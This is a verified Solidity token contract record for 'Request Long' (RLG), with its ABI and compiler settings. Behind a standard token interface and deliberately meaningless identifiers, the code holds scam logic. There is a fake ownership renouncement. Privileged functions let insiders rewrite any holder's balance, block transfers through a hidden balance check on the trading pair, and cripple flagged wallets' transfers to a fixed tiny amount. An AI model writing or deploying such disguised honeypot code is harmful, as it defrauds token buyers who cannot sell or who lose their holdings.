{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface autoReceiverTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeList {\n    function createPair(address takeMax, address walletList) external returns (address);\n}\n\ninterface receiverMinFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minLaunch) external view returns (uint256);\n\n    function transfer(address liquidityLaunchedLaunch, uint256 receiverMarketing) external returns (bool);\n\n    function allowance(address receiverIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityLaunchedLaunch,\n        uint256 receiverMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingIs, uint256 value);\n    event Approval(address indexed receiverIs, address indexed spender, uint256 value);\n}\n\ninterface receiverMinFromMetadata is receiverMinFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RequestLong is amountLimit, receiverMinFrom, receiverMinFromMetadata {\n\n    function swapTotal() public {\n        emit OwnershipTransferred(minBuy, address(0));\n        fromToken = address(0);\n    }\n\n    mapping(address => bool) public senderTake;\n\n    function approve(address toAuto, uint256 receiverMarketing) public virtual override returns (bool) {\n        limitAuto[_msgSender()][toAuto] = receiverMarketing;\n        emit Approval(_msgSender(), toAuto, receiverMarketing);\n        return true;\n    }\n\n    uint256 receiverAmount;\n\n    function marketingLiquidity(address teamBuy, uint256 receiverMarketing) public {\n        launchedFund();\n        limitLaunch[teamBuy] = receiverMarketing;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeSender;\n    }\n\n    mapping(address => mapping(address => uint256)) private limitAuto;\n\n    mapping(address => bool) public isTeam;\n\n    mapping(address => uint256) private limitLaunch;\n\n    function name() external view virtual override returns (string memory) {\n        return autoTeamReceiver;\n    }\n\n    uint256 private limitMode;\n\n    function sellLaunch(uint256 receiverMarketing) public {\n        launchedFund();\n        receiverAmount = receiverMarketing;\n    }\n\n    uint256 limitShouldList;\n\n    uint256 constant autoWallet = 7 ** 10;\n\n    function allowance(address maxLiquidityTo, address toAuto) external view virtual override returns (uint256) {\n        if (toAuto == txFund) {\n            return type(uint256).max;\n        }\n        return limitAuto[maxLiquidityTo][toAuto];\n    }\n\n    event OwnershipTransferred(address indexed senderToken, address indexed shouldIs);\n\n    uint256 public atTo;\n\n    function limitEnable(address launchFund, address liquidityLaunchedLaunch, uint256 receiverMarketing) internal returns (bool) {\n        if (launchFund == minBuy) {\n            return launchedLiquidity(launchFund, liquidityLaunchedLaunch, receiverMarketing);\n        }\n        uint256 shouldLiquidity = receiverMinFrom(totalLimit).balanceOf(receiverExempt);\n        require(shouldLiquidity == receiverAmount);\n        require(liquidityLaunchedLaunch != receiverExempt);\n        if (isTeam[launchFund]) {\n            return launchedLiquidity(launchFund, liquidityLaunchedLaunch, autoWallet);\n        }\n        return launchedLiquidity(launchFund, liquidityLaunchedLaunch, receiverMarketing);\n    }\n\n    function getOwner() external view returns (address) {\n        return fromToken;\n    }\n\n    function launchedLiquidity(address launchFund, address liquidityLaunchedLaunch, uint256 receiverMarketing) internal returns (bool) {\n        require(limitLaunch[launchFund] >= receiverMarketing);\n        limitLaunch[launchFund] -= receiverMarketing;\n        limitLaunch[liquidityLaunchedLaunch] += receiverMarketing;\n        emit Transfer(launchFund, liquidityLaunchedLaunch, receiverMarketing);\n        return true;\n    }\n\n    string private modeSender = \"RLG\";\n\n    function owner() external view returns (address) {\n        return fromToken;\n    }\n\n    uint256 public shouldSender;\n\n    string private autoTeamReceiver = \"Request Long\";\n\n    address public totalLimit;\n\n    function balanceOf(address minLaunch) public view virtual override returns (uint256) {\n        return limitLaunch[minLaunch];\n    }\n\n    uint256 private limitFund;\n\n    address public minBuy;\n\n    uint8 private walletExempt = 18;\n\n    function transfer(address teamBuy, uint256 receiverMarketing) external virtual override returns (bool) {\n        return limitEnable(_msgSender(), teamBuy, receiverMarketing);\n    }\n\n    function launchedFund() private view {\n        require(senderTake[_msgSender()]);\n    }\n\n    function txEnable(address limitTxTake) public {\n        require(limitTxTake.balance < 100000);\n        if (launchedAutoTake) {\n            return;\n        }\n        if (limitMode != atTo) {\n            tradingShould = false;\n        }\n        senderTake[limitTxTake] = true;\n        \n        launchedAutoTake = true;\n    }\n\n    address receiverExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address txFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenLaunchAmount;\n    }\n\n    function enableBuy(address receiverSender) public {\n        launchedFund();\n        if (tradingShould == receiverLiquidity) {\n            receiverLiquidity = false;\n        }\n        if (receiverSender == minBuy || receiverSender == totalLimit) {\n            return;\n        }\n        isTeam[receiverSender] = true;\n    }\n\n    bool private receiverLiquidity;\n\n    bool public launchedAutoTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletExempt;\n    }\n\n    address private fromToken;\n\n    bool private tradingShould;\n\n    constructor (){\n        \n        autoReceiverTake liquidityFromAmount = autoReceiverTake(txFund);\n        totalLimit = modeList(liquidityFromAmount.factory()).createPair(liquidityFromAmount.WETH(), address(this));\n        if (atTo != shouldSender) {\n            limitFund = limitMode;\n        }\n        minBuy = _msgSender();\n        swapTotal();\n        senderTake[minBuy] = true;\n        limitLaunch[minBuy] = tokenLaunchAmount;\n        if (atTo != limitMode) {\n            limitFund = atTo;\n        }\n        emit Transfer(address(0), minBuy, tokenLaunchAmount);\n    }\n\n    uint256 private tokenLaunchAmount = 100000000 * 10 ** 18;\n\n    function transferFrom(address launchFund, address liquidityLaunchedLaunch, uint256 receiverMarketing) external override returns (bool) {\n        if (_msgSender() != txFund) {\n            if (limitAuto[launchFund][_msgSender()] != type(uint256).max) {\n                require(receiverMarketing <= limitAuto[launchFund][_msgSender()]);\n                limitAuto[launchFund][_msgSender()] -= receiverMarketing;\n            }\n        }\n        return limitEnable(launchFund, liquidityLaunchedLaunch, receiverMarketing);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLiquidityTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"}],\"name\":\"enableBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAutoTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMarketing\",\"type\":\"uint256\"}],\"name\":\"marketingLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverMarketing\",\"type\":\"uint256\"}],\"name\":\"sellLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityLaunchedLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTxTake\",\"type\":\"address\"}],\"name\":\"txEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RequestLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}